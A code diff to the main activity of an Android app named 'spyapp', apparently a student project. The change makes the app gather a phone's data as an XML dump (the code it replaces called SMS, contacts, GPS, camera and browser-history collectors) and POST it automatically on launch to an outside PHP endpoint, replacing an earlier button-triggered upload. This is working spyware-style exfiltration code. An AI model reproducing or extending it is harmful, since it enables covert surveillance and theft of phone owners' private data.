@@ -1,9 +1,12 @@
 package com.example.spyapp;
 
+import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.ArrayList;
@@ -12,6 +15,7 @@ import java.util.List;
 import localisationInformations.Localisation;
 
 import org.apache.http.HttpResponse;
+import org.apache.http.HttpStatus;
 import org.apache.http.NameValuePair;
 import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
@@ -26,10 +30,10 @@ import android.app.Activity;
 import android.content.Context;
 import android.os.Bundle;
 import android.os.Looper;
+import android.text.util.Linkify;
 import android.util.Log;
 import android.view.Menu;
-import android.view.View;
-import android.widget.Button;
+import android.widget.TextView;
 import android.widget.Toast;
 import browserInformations.BrowserHistory;
 import contactsinformations.ListContact;
@@ -41,43 +45,37 @@ public class SpyActivity extends Activity {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
 		
-		//print sms conversations
-		//(new GetSMS()).getAllSms(this);
-		//ListContact listContact=new ListContact();
-		//listContact.CreateListContactFromPhone(this);
-		//listContact.GetAllContactsInformations();
-	//(new PhoneDevice()).setAllPhoneDeviceInformations();
-		
-		//(new Picture()).takePictureNoPreview(this);
-		//(new Localisation()).getGPS(this);
-		//(new Localisation())._getLocation(this);
-		//(new BrowserHistory()).getBrowserHist(this);
-	//Log.d("non",returnAllXML(this));
-		final String VALUE = returnAllXML(this);
-		//Log.d("non","Longueur VALUE : "+VALUE.length());
-	(new PhoneDevice()).OwnerInformationsToXML(this);
-		Button sendButton = (Button) findViewById(R.id.button1);
 		final SpyActivity zis = this;
-		sendButton.setOnClickListener(new View.OnClickListener() {
-		    public void onClick(View view) {
-		            //upload();
-		    		Thread t = new Thread(new Runnable() {
-						public void run() {
-							Looper.prepare();
-							try {
-								uploadUtilisateur(VALUE);
-								Toast.makeText(zis, "Upload suceeded", Toast.LENGTH_LONG).show();
-					        } catch (Exception e) {
-					            Toast.makeText(zis, "ERREUR: "+e.toString(), Toast.LENGTH_LONG).show();  
-					            e.printStackTrace();
-					        }
-						}
-					});
-		    		t.start();
-		    }
-		});
+		final TextView urlText = (TextView)zis.findViewById(R.id.texturl);
+		final TextView loading = (TextView)zis.findViewById(R.id.loading);
 		
-	       
+		Thread t = new Thread(new Runnable() {
+			public void run() {
+				final String VALUE = returnAllXML(zis);
+				Looper.prepare();
+				try {
+					final String response = sendAllInfos(VALUE);
+					runOnUiThread(new Runnable() {
+					     public void run() {
+					    	 Toast.makeText(zis, "Succeeded !", Toast.LENGTH_LONG).show();
+					    	 urlText.setText(getURLUser(response));
+					    	 loading.setText("");
+					    	 //urlText.setAutoLinkMask(Linkify.WEB_URLS);
+					    }
+					});
+					
+		        } catch (final Exception e) {
+		            runOnUiThread(new Runnable() {
+					     public void run() {
+					    	 Toast.makeText(zis, "ERROR !", Toast.LENGTH_LONG).show();
+					    	 urlText.setText("Error : "+e.toString());
+					    	 loading.setText("");
+					    }
+					});
+		        }
+			}
+		});
+		t.start();
 	}
 
 	@Override
@@ -87,13 +85,10 @@ public class SpyActivity extends Activity {
 		return true;
 	}
 	
-	public void uploadUtilisateur(String VALUE) throws Exception {
+	public String sendAllInfos(String VALUE) throws Exception {
 		// Create a new HttpClient and Post Header
 	    HttpClient httpclient = new DefaultHttpClient();
-	    HttpPost httppost = new HttpPost("http://uqac.netii.net/sendxml.php");
-	    
-	    
-
+	    HttpPost httppost = new HttpPost("http://uqac.netii.net/senduserinfos.php");
 	    try {
 	        // Add your data
 	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
@@ -106,14 +101,43 @@ public class SpyActivity extends Activity {
 
 	        // Execute HTTP Post Request
 	        HttpResponse response = httpclient.execute(httppost);
+	        
+	        InputStream ips  = response.getEntity().getContent();
+	        BufferedReader buf = new BufferedReader(new InputStreamReader(ips,"UTF-8"));
+	        if(response.getStatusLine().getStatusCode()!=HttpStatus.SC_OK)
+	        {
+	            throw new Exception(response.getStatusLine().getReasonPhrase());
+	        }
+	        StringBuilder sb = new StringBuilder();
+	        String s;
+	        while(true )
+	        {
+	            s = buf.readLine();
+	            if(s==null || s.length()==0)
+	                break;
+	            sb.append(s);
+
+	        }
+	        buf.close();
+	        ips.close();
+	        return sb.toString();
 
 	    } catch (ClientProtocolException e) {
-	        // TODO Auto-generated catch block
+	        return null;
 	    } catch (IOException e) {
-	        // TODO Auto-generated catch block
+	    	return null;
 	    }
     }
 	
+	
+	public String getURLUser(String httpResponse){
+		Log.d("HTTP",httpResponse);
+		int indexDebut = httpResponse.indexOf('#');
+		int indexFin = httpResponse.indexOf('#', indexDebut+1);
+		if (indexDebut>0 && indexFin>0 && indexFin>indexDebut)
+			return httpResponse.substring(indexDebut+1, indexFin);
+		return "0";
+	}
 	
 	public String returnAllXML(Context context){
 
